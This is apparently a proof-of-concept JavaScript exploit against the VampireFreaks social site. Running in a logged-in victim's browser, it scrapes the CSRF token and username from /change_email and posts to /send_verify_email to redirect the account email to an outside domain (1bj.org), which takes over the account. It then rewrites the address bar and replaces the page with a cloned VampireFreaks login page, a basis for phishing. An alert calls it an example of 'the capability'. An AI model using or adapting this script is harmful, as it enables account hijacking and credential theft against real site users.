function getNewHttpObject() {
var objType = false;
try {
objType = new ActiveXObject('Msxml2.XMLHTTP');
} catch(e) {
try {
objType = new ActiveXObject('Microsoft.XMLHTTP');
} catch(e) {
objType = new XMLHttpRequest();
}
}
return objType;
}

function getAXAH(url){

var theHttpRequest = getNewHttpObject();
theHttpRequest.onreadystatechange = function() {processAXAH();};
theHttpRequest.open("GET", url);
theHttpRequest.send(false);

function processAXAH(){
if (theHttpRequest.readyState == 4) { if (theHttpRequest.status == 200) {

var html = theHttpRequest.responseText;
var tokloc = /_token.*value=\"(.*)"/g.exec(html);
var token = tokloc[1];
try {
var usrloc = /href="\/friends\/(.*)">My Friends/g.exec(html);
var usr = usrloc[1];
} catch(e) {
	alert('must be logged in');
}
console.log(usr + ' and ' + token);
postAXAH('http://' + window.location.hostname + '/send_verify_email', '_token=' + token + '&user_email=' + usr + '%401bj.org');

}}}}


function postAXAH(url, params) {
var theHttpRequest = getNewHttpObject();
               
theHttpRequest.onreadystatechange = function() {
	if (theHttpRequest.readyState == 4) { if (theHttpRequest.status == 200) { 
		var html = `
<link rel="stylesheet" href="/_style/bootstrap.min.css">

<link rel="stylesheet" type="text/css" href="/_style/themeroller/custom.css" media="screen"/>
<link rel="stylesheet" type="text/css" href="/_style/main_style.css?1" media="screen"/>
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>
<script src="/_script/main_scripts.js?6"></script>

<script src="/_script/bootstrap.js"></script>
<div class="modal fade" id="show_points_modal" tabindex="-1" role="dialog" aria-labelledby="points given" aria-hidden="true">
<div class="modal-dialog modal-md">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
<h4 class="modal-title" id="myModalLabel">Points given </h4>
</div>
<div class="modal-body">
<div id="points_given_content"></div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="vf_modal" tabindex="-1" role="dialog" aria-labelledby="points given" aria-hidden="true">
<div class="modal-dialog modal-md">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
<h4 class="modal-title" id="vf_modal_title"></h4>
</div>
<div class="modal-body">
<div id="vf_modal_body"></div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div id="header" class="maintop">
<nav id="main-navbar" class="navbar navbar-inverse navbar-static-top">
<div class="container-fluid">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="navbar-brand" style="padding-top:2px; margin-top:0px;" href="/"><img src="/_img/site/logo.png" style="width:360px; max-width:98%"></a>
</div>
<div id="navbar" class="collapse navbar-collapse navbar-right">

<ul class="nav navbar-nav visible-xs">
<li><a href="/">Home</a></li>
<li><a href="/auth/login">Login</a></li>
<li><a href="/user/signup">Signup</a></li>
<li><a href="http://store.vampirefreaks.com">VF Store</a></li>
</ul>

<ul class="nav navbar-nav hidden-xs">
<li><a href="/">Home</a></li>
<li><a href="/auth/login">Login</a></li>
<li><a href="/user/signup">Signup</a></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Users <span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="/user_search">Search / Browse</a></li>
<li><a href="/user_search_results?page_type=online">Online Members</a></li>
<li><a href="/bands">Bands</a></li>
<li><a href="/group_browse">Cults</a></li>
<li><a href="/user_search_results?page_type=newest_members">Newest Members</a></li>
<li><a href="/user_search_results?page_type=newest_girls">Newest Girls</a></li>
<li><a href="/user_search_results?page_type=newest_guys">Newest Boys</a></li>
<li><a href="/top_rated/female/weekly">Top Girls This Week</a></li>
<li><a href="/top_rated/male/weekly">Top Guys This Week</a></li>
<li><a href="/top_rated/female/monthly">Top Girls This Month</a></li>
<li><a href="/top_rated/male/monthly">Top Guys This Month</a></li>
<li><a href="/top_weekly_points">Top VF Points This Week</a></li>
<li><a href="/top_monthly_points">Top VF Points This Month</a></li>
<li><a href="/vfmodels">VF Models</a></li>
<li><a href="/importer">Friend Finder</a></li>
</ul>
</li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">VF <span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="/site_updates">Site Updates</a></li>
<li><a href="/support">Support</a></li>
<li><a href="/site/faq">FAQ</a></li>
<li><a href="/site/about">About</a></li>
</ul>
</li>
<li><a href="http://store.vampirefreaks.com">Store</a></li>
</ul>
</div>
</div>
</nav>
</div>
<div style="clear:both"></div>
<link rel="stylesheet" type="text/css" href="/_style/main_page.css"/>
<link rel="stylesheet" type="text/css" href="/_style/jquery.fullPage.css"/>
<script type="text/javascript" src="/_script/vendors/jquery.easings.min.js"></script>
<script type="text/javascript" src="/_script/jquery.fullPage.min.js"></script>
<script type="text/javascript" src="/_script/main_page.js?1"></script>
<script src="/_script/facebook_functions.js"></script>
<script>


    function fb_login(){
        //called when you click the 'login with facebook' button
        FB.login(function(response) {
            console.log(response);
            if (response.authResponse) {
                console.log('Welcome!  Fetching your information.... ');
                //document.getElementById('fb_login_user').value=response.authResponse.userID;
                //document.getElementById('fb_login_key').value=response.authResponse.accessToken;
                console.log(response.authResponse.accessToken);

                facebookLogin(response.authResponse.userID, response.authResponse.accessToken);
            } else {
                console.log('User cancelled login or did not fully authorize.');
            }
        }, {scope: 'email, public_profile, user_birthday'});
    }



    window.fbAsyncInit = function() {
        FB.init({
            appId      : fb_app_id,
            cookie     : true,  // enable cookies to allow the server to access
                                // the session
            xfbml      : true,  // parse social plugins on this page
            version    : 'v2.2' // use version 2.2
        });

    };




    // Load the SDK asynchronously
    (function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = "//connect.facebook.net/en_US/sdk.js";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

    document.getElementById("signup-button").onclick = function () {
        ;
    };

</script>
<div id="fullpage">
<div class="section" style="height:100%;">
<div class="main container" style="height:100%;">
<div class="inner-content">
<form class="login-form" method="POST" action="http://vampirefreaks.com/auth/login">
<input type="hidden" name="_token" value="SzR4EQoj4QSEig711zjXd3u7tVIihxoRVRProKez">
Login:
<div class="form-group">
<input type="text" class="form-control input-sm" name="user_name" placeholder="Name"/>
</div>
<div class="form-group">
<input type="password" class="form-control input-sm" name="user_password" placeholder="Password"/>
</div>
<div class="form-group">
<span class="meta text-left"><a href="/lost_password">Forgot Password?</a></span>
<button type="button" class="btn-sm pull-right blue facebook" onclick="fb_login(); return false;">Login with<span class="icon icon-facebook"></span></button>
<button type="submit" class="btn-sm pull-right black" onclick="this.form.submit();">Login</button>
</div>
<div id="fb-response"></div>
</form>
<form class="signup-form" method='get' action='/user/signup'>
<div class="form-group clearfix">
Create An Account:<br>
<button id="signup-button" onclick="this.form.submit(); " class="btn-sm black" style="width:100%; margin:0px;">Signup</button>
</div>
</form>
<div class="main_tagline"></div>
</div>
</div>
</div>
<div class="section">
<div class="container vf-slide">
<div class="blog-entry">
<div class="blog-subject blog-title"><a href="/journal_entry/8821768">Horror Flicks</a>
<div class="blog-date">7 hours ago</div><div class="clear"></div></div>
<div class="featured_content blog-content"><center><a href="https://media.giphy.com/media/WpVKSxnrQavny/giphy.gif"><div><img src="https://media.giphy.com/media/WpVKSxnrQavny/giphy.gif" class="entered_img"></div></a></center><br/>
<center><font size="4"><font color="red">Hello Vampirefreaks!<br/>
<br/>
Today we're curious about what your favorite horror movies are!<br/>
<br/>
Tell us your favorites, post gifs or even clips from YouTube.<br/>
<br/>
<b>---Try not to post spoilers!---</b><br/>
<br/>
What is your favorite horror sub-genre?<br/>
<br/>
What do you love about horror films?<br/>
<br/>
What do you dislike or wish they would change?<br/>
<br/>
Do you prefer the classic films or the newer horror films?<br/>
<br/>
Post your favorites, gifs and comments below! <img src='//e.vampirefreaks.com/emotes/pointdown.gif' alt='pointdown' title='pointdown'><br/>
</font></font></center></div>
</div>
<div class="blog-entry">
<div class="blog-subject blog-title"><a href="/journal_entry/8821749">Video Interview with Xentrifuge!</a>
<div class="blog-date">11 hours ago</div><div class="clear"></div></div>
<div class="featured_content blog-content">I did a video interview with <a href="/Xentrifuge"><img src="http://e.vampirefreaks.com/emotes/vf_white-16.png" class="tag_icon" border="0"/>Xentrifuge</a> we chatted about their upcoming album, Dark Side Of The Con, how to pronounce their name and more! check it out:<br/>
<a href="https://www.youtube.com/watch?v=q-LmrXIaDUw">
<div><iframe width='560' height='315' src='https://www.youtube.com/embed/q-LmrXIaDUw' frameborder='0' allowfullscreen></iframe>
</div></a></div>
</div>
<div class="blog-entry">
<div class="blog-subject blog-title"><a href="/journal_entry/8821727">Writhe and Shine #391 - Sighting</a>
<div class="blog-date">21 hours ago</div><div class="clear"></div></div>
<div class="featured_content blog-content"><a href="http://www.writheandshine.com/comic/391-sighting/" target="_blank"><img src="https://c3.patreon.com/1/patreon-posts/3525395896328811417.jpg?v=xy6gIiTPlfIv0qu4LhRyq5vFu0qcOcwVg2UgkzZVnog%3D"/></a></div>
</div>
<div class="blog-entry">
<div class="blog-subject blog-title"><a href="/journal_entry/8821685">VampireFreaks Art Contest!</a>
<div class="blog-date">1 day ago</div><div class="clear"></div></div>
<div class="featured_content blog-content"><img src="http://e.vampirefreaks.com/images/vf_flyers/vf_3color_sticker_s.gif" align="right" style="width:130px"/><br/>
VampireFreaks Artwork Contest!<br/>
Submit any form of vampirefreaks-related art (digital art, painting, sculpture, etc, feel free to get creative)<br/>
<br/>
1st Prize:<br/>
$100 Cash plus $100 gift certificate to the <a href="http://store.vampirefreaks.com">VF Store</a><br/>
<br/>
2nd Prize:<br/>
A VF Hoodie or VF Messenger-bag of your choice<br/>
<br/>
3rd Prize:<br/>
1 year VF Premium Membership<br/>
<br/>
Details:<br/>
To enter the contest, simply post pictures of your art as comments on this thread.<br/>
You may enter multiple times if you have multiple unique pieces of artwork.<br/>
Maximum of 4 photos per entry.<br/>
Contest Ends May 29th!<br/>
<br/>
</div>
</div>
</div>
</div>
<div class="section">
<div class="container vf-slide">
<div class="featured-title"><a href="/user_search_results?page_type=online">Members Online</a></div>
<div class="featured_fullheight">
</div>
</div>
</div>
</div>
<script>
    $.ajaxSetup({
        headers: {
            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
        }
    })
</script>

<div class="modal fade" id="report_user_modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
<div class="modal-dialog modal-md">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
<h4 class="modal-title" id="myModalLabel">Block / Report user: <span class="modal_report_username"></span></h4>
</div>
<div class="modal-body">
<div class="report_ajax_result" style="color:red; font-weight:bold; font-size:1.2em;"></div>
<form id="report_user_form" method="post">
<h5>Click The Following Button to Block this user and prevent them from contacting you:</h5>
<button class="btn btn-primary btn-block profile-button" id="button_block_user" type="button" onclick="blockUserFromForm(); return false;">
Block User : <span class="modal_report_username"></span></button>
<div id="block_user_form_response" style="color:red; font-weight:bold; font-size:1.2em;"></div>
<h5>To report this content to the VF Admins, submit your complaint below:</h5>
<div id="report_user_form_response" style="color:red; font-weight:bold; font-size:1.2em;"></div>
<div style="margin: 10px auto 5px auto; font-weight:bold; font-size:1.1em;">Submit Report:</div>
<input id="report_subject" name="subject" placeholder="Subject" required class="form-control" style="margin-bottom:10px;">
<textarea id="report_content" name="message" required class="form-control message_text" placeholder="Enter Message" style="height:150px;"></textarea>
<input type="hidden" name="_token" value="SzR4EQoj4QSEig711zjXd3u7tVIihxoRVRProKez">
<input type="hidden" id="report_user_id" name="report_user_id" value="">
<input type="hidden" id="report_username" name="report_username" value="">
<input type="hidden" id="report_content_type" name="report_content_type" value="">
<input type="hidden" id="report_content_id" name="report_content_id" value="">
</form>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" onclick="reportUserSubmit()">Send</button>
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<script>
    $(document)
            .on('show.bs.modal', '.modal', function(event) {
                $(this).appendTo($('body'));
            })
            .on('shown.bs.modal', '.modal.in', function(event) {
                setModalsAndBackdropsOrder();
            })
            .on('hidden.bs.modal', '.modal', function(event) {
                setModalsAndBackdropsOrder();
            });

    function setModalsAndBackdropsOrder() {
        var modalZIndex = 1040;
        $('.modal.in').each(function(index) {
            var $modal = $(this);
            modalZIndex++;
            $modal.css('zIndex', modalZIndex);
            $modal.next('.modal-backdrop.in').addClass('hidden').css('zIndex', modalZIndex - 1);
        });
        $('.modal.in:visible:last').focus().next('.modal-backdrop.in').removeClass('hidden');
    }
</script>
<div class="footer_links center">
<hr>
<small>
[ <a href="/site/tos">Terms of Service</a> ]
[ <a href="/site/about">About</a> ]
[ <a href="/site/faq">FAQ</a> ]
[ <a href="/site/privacy">Privacy Policy</a> ]
[ <a href="/support">Support</a> ]
<br>
&copy; VampireFreaks 2017 &nbsp; All Rights Reserved
</small>
</div>
</body>
`;

history.replaceState({foo:'bar'}, "VampireFreaks", "/");
document.body.innerHTML = html;
alert("this is just an example and still needs some work, but you can see the capability..\nlook at the address bar");
}}};
theHttpRequest.open("POST", url);
theHttpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=iso-8859-2');
theHttpRequest.send(params);

}
console.log('running script');
getAXAH('http://' + window.location.hostname + '/change_email');